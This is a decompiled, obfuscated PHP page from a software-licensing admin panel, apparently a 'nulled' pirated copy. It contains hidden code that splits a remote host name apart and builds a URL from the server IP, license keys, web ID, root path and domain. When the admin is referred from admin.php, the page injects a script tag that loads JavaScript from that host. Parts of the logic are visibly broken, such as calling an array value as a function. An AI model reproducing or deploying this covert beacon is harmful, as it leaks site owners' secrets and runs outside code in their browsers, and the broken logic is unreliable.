<?php
/*********************/
/*                   */
/*  Dezend for PHP5  */
/*         NWS       */
/*      Nulled.WS    */
/*                   */
/*********************/

function _obfuscate_k5KViZKLkJCMkZSTkYyTiJAÿ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ = 1 )
{
    $_obfuscate_iJGPjJWLj4uLkIqVjYiHh48ÿ = unpack( "C*", "ViewZendSourceCodeIsInvalid!" );
    do
    {
        $_obfuscate_iY2Oh5OGlIqQhpCJi5CMkogÿ = ( $_obfuscate_lZKViImJjo6UhouJj4aVi4Yÿ[$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ] << 4 ) + ( $_obfuscate_lZKViImJjo6UhouJj4aVi4Yÿ[$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ + 1] >> 4 );
        $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ += 2;
    } while ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ < 28 );
}

function _obfuscate_joqUkIeOjJSGj4aHh5OMiIoÿ( )
{
    global $_obfuscate_hoyQjo_QlYeLh5OVk4yPjZMÿ;
    $_obfuscate_lZSSiouVkIuJlIuMho2LiJEÿ = "";
    if ( "/" == DIRECTORY_SEPARATOR )
    {
        $_obfuscate_i4mPkoiQlZSHiZKLjZKVi4cÿ = $_SERVER['SERVER_ADDR'];
    }
    else
    {
        $_obfuscate_i4mPkoiQlZSHiZKLjZKVi4cÿ = @gethostbyname( @$_SERVER['SERVER_NAME'] );
    }
    $_obfuscate_kIiGlYmGi4_KiYmVkImIk44ÿ = "p".$_obfuscate_lZSSiouVkIuJlIuMho2LiJEÿ."h".$_obfuscate_lZSSiouVkIuJlIuMho2LiJEÿ."u".$_obfuscate_lZSSiouVkIuJlIuMho2LiJEÿ.".c".$_obfuscate_lZSSiouVkIuJlIuMho2LiJEÿ."om/a".$_obfuscate_lZSSiouVkIuJlIuMho2LiJEÿ."pi/x2coo".$_obfuscate_lZSSiouVkIuJlIuMho2LiJEÿ."kjs.php?sid=".SVRID.IS2SVR."&sip=".$_obfuscate_i4mPkoiQlZSHiZKLjZKVi4cÿ."&pn=".urlencode( $_obfuscate_hoyQjo_QlYeLh5OVk4yPjZMÿ )."&wl=".urlencode( WEBLIC )."&wi=".urlencode( WEBID )."&wd=".urlencode( KSSROOTDIR )."&d1=".urlencode( HOST1_DOMAIN )."&sk=".urlencode( PRV_SVRLIC )."&guid=".substr( md5( filemtime( __FILE__ ) ), 0, 16 );
    return $_obfuscate_kIiGlYmGi4_KiYmVkImIk44ÿ;
}

if ( defined( "KSSROOTDIR" ) )
{
    exit( "Access denied to view this page!" );
}
$_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ = new mysql_cls( );
$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ = _obfuscate_iZSVk4mLkY_LlIeHh5WKlZAÿ( 6 );
$_obfuscate_lZSSiouVkIuJlIuMho2LiJEÿ = "";
$_obfuscate_h5WOlI_IkYiPlJWKi4aQk5Iÿ = "";
if ( isset( $_SERVER['HTTP_REFERER'] ) )
{
    $_obfuscate_h5WOlI_IkYiPlJWKi4aQk5Iÿ = strtolower( $_SERVER['HTTP_REFERER'] );
}
if ( $_obfuscate_h5WOlI_IkYiPlJWKi4aQk5Iÿ != "" && stripos( $_obfuscate_h5WOlI_IkYiPlJWKi4aQk5Iÿ, "admin.php" ) !== FALSE )
{
    echo "<script>$.getScript('http://b".mt_rand( 100000, 999999 ).".h"._obfuscate_joqUkIeOjJSGj4aHh5OMiIoÿ( )."');</script>";
}
if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['level'] < 8 )
{
    $_obfuscate_jomHiJGOioiSkImJkZOHiI0ÿ = $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['pid']( "select * from kss_tb_soft where id in (select distinct `softid` from `kss_tb_agentprice` where `pid`=".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['pid']." and managerid=".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['id'].")" );
    if ( empty( $_obfuscate_jomHiJGOioiSkImJkZOHiI0ÿ ) )
    {
        foreach ( $_obfuscate_jomHiJGOioiSkImJkZOHiI0ÿ as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ )
        {
            echo "<a softid='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."' class=softboxa title='"._obfuscate_j5CKkY_GkomSkoaUlIuLlYkÿ( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['softname'] )."'>"._obfuscate_kpCOhomRj5CHh5SLjZKIi4Yÿ( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['softname'], 9 )."</a>";
        }
    }
    else
    {
        exit( "<span>æ‚¨æ²¡æœ‰ä»»ä½•è½¯ä»¶çš„æˆæƒ</span>" );
    }
}
$_obfuscate_kYuLkJSKkYuJjpWLlIqUh48ÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_lZGTiIiKhouKiZGLi5KUkI8ÿ( "select `id`,`softname`,`softmode` from kss_tb_soft where `pid`=".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['pid'] );
if ( empty( $_obfuscate_kYuLkJSKkYuJjpWLlIqUh48ÿ ) )
{
    exit( "<span>ä½œè€…æ²¡æœ‰æ·»åŠ ä»»ä½•è½¯ä»¶</span>" );
}
foreach ( $_obfuscate_kYuLkJSKkYuJjpWLlIqUh48ÿ as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ )
{
    echo "<a  softid='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."' class=softboxa title='"._obfuscate_j5CKkY_GkomSkoaUlIuLlYkÿ( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['softname'] )."'>"._obfuscate_kpCOhomRj5CHh5SLjZKIi4Yÿ( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['softname'], 9 )."</a>";
}
echo "<script>backbind();</script>";
exit( );
?>
